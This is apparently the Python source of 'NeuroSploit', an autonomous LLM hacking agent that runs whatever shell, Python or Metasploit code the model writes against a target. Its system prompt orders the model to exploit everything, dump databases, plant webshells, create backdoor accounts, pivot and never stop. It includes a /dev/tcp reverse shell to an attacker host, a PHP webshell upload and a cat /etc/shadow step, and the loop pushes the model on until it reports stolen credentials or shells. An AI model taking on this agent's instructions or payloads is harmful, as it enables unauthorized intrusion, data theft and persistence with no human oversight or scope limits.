#!/usr/bin/env python3
"""
NeuroSploit SaaS v2 - Dynamic AI Agent
Fully AI-driven with NO hardcoded solutions.
The AI decides which tools to use, how to approach problems, and how to troubleshoot.
"""

import os
import sys
import json
import subprocess
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict, field

LOG_DIR = os.getenv("LOG_DIR", "/pentest/logs")
os.makedirs(LOG_DIR, exist_ok=True)

sys.path.insert(0, os.path.dirname(__file__))
from llm_client import LLMClient


@dataclass
class Execution:
    """Captures any execution - command, script, or tool"""
    timestamp: str
    iteration: int
    execution_type: str  # command, python, bash, msfconsole, etc.
    content: str         # the actual command/code
    stdout: str
    stderr: str
    exit_code: int
    duration_ms: int
    success: bool
    tool_used: str       # detected tool name
    mitre_techniques: List[str] = field(default_factory=list)  # MITRE ATT&CK technique IDs
    

class DynamicAgent:
    """
    Fully dynamic AI agent that:
    - Has NO hardcoded exploit logic
    - Lets the AI decide which tools to use
    - Can execute ANY command/tool in Kali
    - Captures all I/O for debugging
    - Feeds errors back to AI for troubleshooting
    
    The AI is instructed via system prompt only - no hardcoded behavior.
    """
    
    # System prompt - this is the ONLY place we guide AI behavior
    SYSTEM_PROMPT_BASE = """You are an autonomous penetration testing AI agent running inside a Kali Linux container.

## YOUR MISSION
You are a REAL penetration tester. You don't just detect vulnerabilities - you EXPLOIT them and extract maximum value.
Your job is NOT complete until you have achieved tangible results:
- Shell access to the target
- Database dumps with actual data
- Credentials (usernames, passwords, API keys)
- Backdoor accounts for persistent access
- Sensitive files and documents

## EXPLOITATION PHILOSOPHY
1. **EXPLOIT EVERYTHING** - When you find a vulnerability, EXPLOIT IT immediately
2. **EXTRACT DATA** - After exploitation, dump databases, extract credentials, download files
3. **GET A SHELL** - Always try to get interactive shell access (reverse shell, web shell, SSH)
4. **CREATE PERSISTENCE** - Create backdoor accounts, plant webshells, establish persistent access
5. **PIVOT AND EXPAND** - Use compromised systems to discover and attack more targets
6. **NEVER STOP** - Continue until you have achieved maximum access and extracted all possible data

## WHAT SUCCESS LOOKS LIKE
Your engagement is NOT complete until you provide:
- **Shell Access**: Command execution on the target (provide the shell command or connection details)
- **Extracted Data**: Actual database contents, not just "database is vulnerable"
- **Credentials**: Real usernames and passwords, not just "credentials may be weak"
- **Persistence**: Backdoor account credentials or webshell location
- **Evidence Files**: Downloaded databases, config files, sensitive documents

## MITRE ATT&CK FRAMEWORK
Tag actions with MITRE techniques:
- **T1190**: Exploit Public-Facing Application
- **T1059**: Command and Scripting Interpreter  
- **T1003**: Credential Dumping
- **T1005**: Data from Local System
- **T1136**: Create Account (persistence)
- **T1105**: Ingress Tool Transfer
- **T1046**: Network Service Discovery
- **T1110**: Brute Force
- **T1090**: Proxy (pivoting)
- **T1021**: Remote Services (lateral movement)

## YOUR CAPABILITIES
ALL Kali Linux tools:
- **Reconnaissance**: nmap, masscan, nikto, whatweb, dirb, gobuster, enum4linux
- **Exploitation**: metasploit, sqlmap, hydra, searchsploit, commix
- **Web Shells**: weevely, webshell generators, reverse shell generators
- **Database Attacks**: sqlmap --dump, mysql/psql clients, mongodump
- **Post-Exploitation**: mimikatz, linpeas, winpeas, pspy
- **Pivoting**: proxychains, chisel, ligolo, ssh tunnels
- **Data Exfil**: curl, wget, nc, base64 encoding
- **Custom Scripts**: Python, Bash, Ruby - write whatever you need

## EXPLOITATION WORKFLOW

### Phase 1: Reconnaissance
```bash
nmap -sV -sC -p- target
```

### Phase 2: Exploit Vulnerabilities
When you find SQLi:
```bash
sqlmap -u "http://target/page?id=1" --dump --batch
```

When you find command injection:
```bash
# Get reverse shell
curl "http://target/vuln?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
```

When you find file upload:
```python
# Upload webshell
import requests
shell = "<?php system($_GET['cmd']); ?>"
requests.post("http://target/upload", files={"file": ("shell.php", shell)})
```

### Phase 3: Post-Exploitation
After getting access:
```bash
# Dump database
mysqldump -u root -p'password' --all-databases > /tmp/dump.sql

# Create backdoor user
useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd

# Extract credentials
cat /etc/shadow
cat /var/www/html/config.php
```

### Phase 4: Pivot to More Targets
```bash
# Scan internal network
nmap -sn 192.168.1.0/24

# Use tcpdump to discover more targets
tcpdump -i eth0 -w capture.pcap

# Set up proxy for pivoting
ssh -D 9050 -N user@compromised-host
```

## REAL RESULTS REQUIRED
DO NOT just report "vulnerability found". You MUST:
1. EXPLOIT the vulnerability
2. EXTRACT actual data
3. PROVIDE working credentials or shell access
4. DOCUMENT exactly what you obtained

Example of GOOD output:
```
EXPLOITATION SUCCESSFUL
========================
Target: http://target.com
Vulnerability: SQL Injection in /app/search

EXTRACTED DATABASE:
- Users table: 150 records
- Admin credentials: admin:SuperSecret123!

BACKDOOR CREATED:
- Username: svc_backup
- Password: N3ur0Spl01t!
- Login: http://target.com/login

SHELL ACCESS:
- Webshell at: http://target.com/uploads/shell.php?cmd=
- Reverse shell: Connect to attacker:4444 after running payload
```

## HOW TO EXECUTE
Provide commands in fenced blocks:

```bash
nmap -sV target
```

```python
import requests
# exploitation code
```

```msfconsole
use exploit/...
set RHOSTS target
exploit
```

## ERROR HANDLING
When something fails:
1. Analyze the error
2. Try a DIFFERENT approach
3. If a tool fails, write custom exploit code
4. Keep trying until you succeed

## NEVER GIVE UP
- If sqlmap doesn't work, try manual injection
- If metasploit fails, search for manual exploits
- If default tools fail, write custom scripts
- Keep pivoting until you own everything

YOU ARE AUTONOMOUS. EXPLOIT EVERYTHING. EXTRACT EVERYTHING. STOP ONLY WHEN YOU HAVE REAL RESULTS.
"""

    def __init__(self, log_dir: str = LOG_DIR, mitre_context: str = None):
        self.log_dir = log_dir
        self.llm = LLMClient(log_dir)
        self.executions: List[Execution] = []
        self.conversation: List[Dict] = []
        self.iteration = 0
        self.max_iterations = 50  # More iterations for thorough exploitation
        self.mitre_context = mitre_context
        
        # Build full system prompt with MITRE context if available
        system_prompt = self.SYSTEM_PROMPT_BASE
        if mitre_context:
            system_prompt += f"\n\n{mitre_context}"
        
        # Initialize with system prompt only
        self.conversation = [
            {"role": "system", "content": system_prompt}
        ]
        
        self._log("Dynamic Agent initialized - fully AI-driven with MITRE ATT&CK awareness")
    
    def _log(self, msg: str, level: str = "INFO"):
        timestamp = datetime.now(timezone.utc).isoformat()
        log_line = f"[{timestamp}] [{level}] {msg}"
        print(log_line)
        with open(f"{self.log_dir}/dynamic_agent.log", 'a') as f:
            f.write(log_line + '\n')
    
    def _extract_executable(self, response: str) -> List[Tuple[str, str]]:
        """
        Extract ALL executable blocks from response.
        Returns list of (type, content) tuples.
        NO assumptions about what type - we detect from the block.
        """
        import re
        executables = []
        
        # Find all fenced code blocks
        pattern = r'```(\w*)\s*\n(.*?)\n```'
        matches = re.findall(pattern, response, re.DOTALL)
        
        for block_type, content in matches:
            block_type = block_type.lower().strip()
            content = content.strip()
            
            if not content:
                continue
            
            # Detect type if not specified
            if not block_type:
                if content.startswith('#!/') or 'import ' in content or 'def ' in content:
                    block_type = 'python'
                elif content.startswith('use ') or content.startswith('set '):
                    block_type = 'msfconsole'
                else:
                    block_type = 'bash'
            
            executables.append((block_type, content))
        
        return executables
    
    def _detect_tool(self, content: str) -> str:
        """Detect which tool is being used - no hardcoded list, just pattern matching"""
        first_word = content.split()[0] if content.split() else "unknown"
        # Remove path if present
        if '/' in first_word:
            first_word = first_word.split('/')[-1]
        return first_word
    
    def _execute(self, exec_type: str, content: str, timeout: int = 120) -> Execution:
        """
        Execute ANY type of content - command, script, msfconsole, etc.
        NO hardcoded handling per tool - generic execution.
        """
        self._log(f"Executing [{exec_type}]: {content[:100]}...")
        
        tool_used = self._detect_tool(content)
        start = time.time()
        
        try:
            if exec_type == 'python':
                # Write to temp file and execute
                script_file = f"{self.log_dir}/temp_script.py"
                with open(script_file, 'w') as f:
                    f.write(content)
                result = subprocess.run(
                    ["python3", script_file],
                    capture_output=True, text=True, timeout=timeout, cwd="/pentest"
                )
            elif exec_type == 'msfconsole':
                # Execute metasploit commands
                rc_file = f"{self.log_dir}/temp_msf.rc"
                with open(rc_file, 'w') as f:
                    f.write(content + "\nexit\n")
                result = subprocess.run(
                    ["msfconsole", "-q", "-r", rc_file],
                    capture_output=True, text=True, timeout=timeout, cwd="/pentest"
                )
            else:
                # Default: execute as shell command
                result = subprocess.run(
                    content,
                    shell=True, capture_output=True, text=True, 
                    timeout=timeout, cwd="/pentest"
                )
            
            duration = int((time.time() - start) * 1000)
            
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
                duration_ms=duration,
                success=result.returncode == 0,
                tool_used=tool_used
            )
            
        except subprocess.TimeoutExpired:
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout="",
                stderr=f"TIMEOUT: Execution exceeded {timeout}s",
                exit_code=-1,
                duration_ms=timeout * 1000,
                success=False,
                tool_used=tool_used
            )
        except Exception as e:
            return Execution(
                timestamp=datetime.now(timezone.utc).isoformat(),
                iteration=self.iteration,
                execution_type=exec_type,
                content=content,
                stdout="",
                stderr=str(e),
                exit_code=-1,
                duration_ms=int((time.time() - start) * 1000),
                success=False,
                tool_used=tool_used
            )
    
    def _save_execution(self, execution: Execution):
        """Save execution to log"""
        self.executions.append(execution)
        with open(f"{self.log_dir}/agent_executions.jsonl", 'a') as f:
            f.write(json.dumps(asdict(execution)) + '\n')
    
    def _build_feedback(self, execution: Execution) -> str:
        """Build feedback message for LLM - no assumptions, just facts"""
        output = execution.stdout[:3000] if execution.stdout else "(no stdout)"
        stderr = execution.stderr[:1500] if execution.stderr else "(no stderr)"
        
        return f"""**Execution Result**
- Tool: `{execution.tool_used}`
- Type: `{execution.execution_type}`
- Exit Code: {execution.exit_code}
- Duration: {execution.duration_ms}ms
- Success: {execution.success}

**stdout:**
```
{output}
```

**stderr:**
```
{stderr}
```

Analyze this output and decide what to do next."""
    
    def run(self, target: str, objective: str) -> Dict:
        """
        Run the agent with a target and objective.
        The AI decides everything else.
        """
        self._log(f"Starting engagement: {target}")
        self._log(f"Objective: {objective}")
        
        # Initial prompt - just the objective, AI decides approach
        initial_prompt = f"""**TARGET**: {target}

**OBJECTIVE**: {objective}

You are now autonomous. Begin your assessment. Decide your approach and execute."""
        
        self.conversation.append({"role": "user", "content": initial_prompt})
        
        while self.iteration < self.max_iterations:
            self.iteration += 1
            self._log(f"=== Iteration {self.iteration}/{self.max_iterations} ===")
            
            # Get AI response
            try:
                response = self.llm.chat(self.conversation)
                self.conversation.append({"role": "assistant", "content": response})
                self._log(f"AI response: {len(response)} chars")
            except Exception as e:
                self._log(f"LLM error: {e}", "ERROR")
                break
            
            # Extract executable blocks
            executables = self._extract_executable(response)
            
            if not executables:
                # Check if AI has achieved REAL results (not just detection)
                success_indicators = [
                    "shell access", "backdoor created", "credentials extracted",
                    "database dumped", "password:", "username:", "webshell",
                    "reverse shell", "exploitation successful", "access gained"
                ]
                has_real_results = any(ind in response.lower() for ind in success_indicators)
                
                done_indicators = ["complete", "finished", "concluded", "final report"]
                if any(ind in response.lower() for ind in done_indicators) and has_real_results:
                    self._log("AI achieved exploitation results - completion accepted")
                    break
                elif any(ind in response.lower() for ind in done_indicators):
                    # AI says done but no real results - push to continue
                    self.conversation.append({
                        "role": "user",
                        "content": """You indicated completion but I don't see REAL exploitation results.

I need you to provide:
1. **Extracted credentials** (actual usernames and passwords)
2. **Shell access** (working webshell URL or reverse shell command)
3. **Database dump** (actual data extracted)
4. **Backdoor account** (username and password for persistent access)

Do NOT stop until you have achieved at least one of these. Continue exploiting."""
                    })
                    continue
                # Ask AI to provide actionable commands
                self.conversation.append({
                    "role": "user",
                    "content": "Please provide specific commands or code to execute in fenced code blocks. Remember: EXPLOIT and EXTRACT real data."
                })
                continue
            
            # Execute each block and collect results
            all_feedback = []
            for exec_type, content in executables:
                execution = self._execute(exec_type, content)
                self._save_execution(execution)
                
                self._log(f"  {execution.tool_used}: exit={execution.exit_code}")
                all_feedback.append(self._build_feedback(execution))
            
            # Send all results back to AI
            combined_feedback = "\n\n---\n\n".join(all_feedback)
            self.conversation.append({"role": "user", "content": combined_feedback})
        
        return self._generate_report()
    
    def _generate_report(self) -> Dict:
        """Generate final report with exploitation results"""
        tools_used = list(set(e.tool_used for e in self.executions))
        successful = sum(1 for e in self.executions if e.success)
        
        # Extract exploitation results from conversation
        exploitation_results = {
            "credentials": [],
            "shells": [],
            "backdoors": [],
            "databases": [],
            "files": []
        }
        
        # Parse conversation for results
        for msg in self.conversation:
            if msg.get("role") == "assistant":
                content = msg.get("content", "").lower()
                if "password" in content and ":" in content:
                    exploitation_results["credentials"].append("Credentials extracted")
                if "webshell" in content or "shell.php" in content:
                    exploitation_results["shells"].append("Webshell deployed")
                if "reverse shell" in content:
                    exploitation_results["shells"].append("Reverse shell available")
                if "backdoor" in content or "svc_" in content:
                    exploitation_results["backdoors"].append("Backdoor account created")
                if "dump" in content or "database" in content:
                    exploitation_results["databases"].append("Database accessed")
        
        report = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "iterations": self.iteration,
            "total_executions": len(self.executions),
            "successful_executions": successful,
            "failed_executions": len(self.executions) - successful,
            "tools_used": tools_used,
            "exploitation_results": exploitation_results,
            "llm_stats": self.llm.get_stats(),
            "executions": [asdict(e) for e in self.executions]
        }
        
        report_file = f"{self.log_dir}/agent_report_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self._log(f"Report: {report_file}")
        return report


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="NeuroSploit Dynamic AI Agent")
    parser.add_argument("--target", required=True, help="Target (IP, URL, or range)")
    parser.add_argument("--objective", required=True, help="What to accomplish")
    parser.add_argument("--max-iterations", type=int, default=15, help="Max iterations")
    
    args = parser.parse_args()
    
    agent = DynamicAgent()
    agent.max_iterations = args.max_iterations
    
    report = agent.run(args.target, args.objective)
    
    print("\n" + "=" * 60)
    print("ENGAGEMENT COMPLETE")
    print("=" * 60)
    print(f"Iterations: {report['iterations']}")
    print(f"Executions: {report['total_executions']} ({report['successful_executions']} success)")
    print(f"Tools used: {', '.join(report['tools_used'])}")
    print(f"LLM tokens: {report['llm_stats']['total_tokens']}")
    print("=" * 60)


if __name__ == "__main__":
    main()
